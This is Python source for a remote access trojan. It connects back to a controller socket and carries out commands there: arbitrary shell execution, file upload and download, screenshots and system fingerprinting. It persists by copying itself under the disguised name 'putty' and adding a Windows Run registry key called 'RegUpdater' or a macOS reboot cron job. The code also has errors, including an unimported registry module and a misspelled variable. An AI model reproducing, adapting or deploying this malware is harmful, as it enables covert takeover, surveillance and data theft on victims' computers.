import socket
import subprocess
import os
import time
from sys import platform as _platform
from PIL import ImageGrab
import tempfile
import shutil
from crontab import CronTab
   
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)


IPADDRESS="EDIT YOUR IP HERE WITHIN THE QUOTES"
PORT=8080 #DEFAULT






def connect():
    while True:
        
        x=5
        try:
            s.connect(('127.0.0.1',8080))
            x=0
            
        except:
            time.sleep(5)
            
        if x == 0 :
            break
        
       
        
def transferupload(s,command):
    upload,fname=command.split('*')
    path=os.getcwd()+"/"
    path += fname
    f=open(path,'wb+')
    bits=s.recv(1024)
    while True:
        f.write(bits)
                
        if bits.endswith('DONE'):
            f.close()
            break
        bits=s.recv(1024)
        
            
def transfergrab(s,path):
    if os.path.exists(path):
        f=open(path,'rb')
        f.seek(0)
        packet=f.read(1024)
        while packet!='':
            s.send(packet)
            packet=f.read(1024)
        s.send("DONE")
        f.close()
    else:
        s.send("The File Doesn't Exist")

        
        
def screenshot(s):
    
    dirpath=tempfile.mkdtemp()
    ImageGrab.grab().save(dirpath + "/img.jpg","JPEG")
    path=dirpath + "/img.jpg"
    f=open(path,'rb')
    f.seek(0)
    packet=f.read(1024)
    while packet!='':
        s.send(packet)
        packet=f.read(1024)
    s.send("DONE")
    f.close()
    
    shutil.rmtree(dirpath)
    




def connection():
    

    while True:
        
        command=s.recv(1024)
            
        
                
        if 'grab' in command:
            grab,path=command.split('*')
            try:
                transfergrab(s,path)
            except Exception,e:
                s.send(str(e))
                pass
        
        elif 'upload' in command:
            transferupload(s,command)

        
        elif 'cd' in command:
                code,directory = command.split ('*') 
                os.chdir(directory) 
                s.send( "[+] CWD Is " + os.getcwd() )
                s.send("DONE")
       
                            
        elif 'shell' in command:
            shell,query = command.split('*')
            cmd=subprocess.Popen(query,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            s.send(cmd.stdout.read())
            s.send(cmd.stderr.read())
            s.send("DONE")
            
        elif 'screenshot' in command:
            screenshot(s)
            

        elif 'SLEEP' in command: 
            s.close()
            time.sleep(100)
            break
            
        elif 'os' in command:
            
            if _platform == "linux" or _platform == "linux2":
                s.send("Linux")
               
            elif _platform == "darwin":
                s.send("Mac os")
               
            elif _platform == "win32":
                s.send("windows")
               
            elif _platform == "win64":
                s.send("windows 64bit")
            else:
                s.send(_platorm)
                
           

if _platform == "win32" or _platform=="win64":
    path = os.getcwd().strip('/n')
    Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')
    destination = userprof.strip('\n\r') + '\\Documents\\'  +'putty.exe'
    
    if not os.path.exists(destination):
        try:
            shutil.copyfile(path+'\putty.exe', destination)
            key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,wreg.KEY_ALL_ACCESS)
            wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,destination)
            key.Close()
        except:
            pass
        
        
        
       

if _platform == "darwin" :
    
    path=os.getcwd()+'/putty.py'
    userprof=os.getlogin()
    destination='/Users/'+ userprof + '/Documents/putty.py' 

    if not os.path.exists(destination):
        
        shutil.copyfile(path,destination)
        
        pythonvariable=subprocess.check_output('which python', shell=True).strip('\n')
        comm='cd /Users/'+userprof+'/Documents/ && ' + pythonvariable +" " + destination

        my_cron = CronTab(user=userprof)
        job = my_cron.new(command=comm)
        job.every_reboot()
        my_cron.write()



 

    
    
        
        
        
        
while True:
    connect()
    connection()
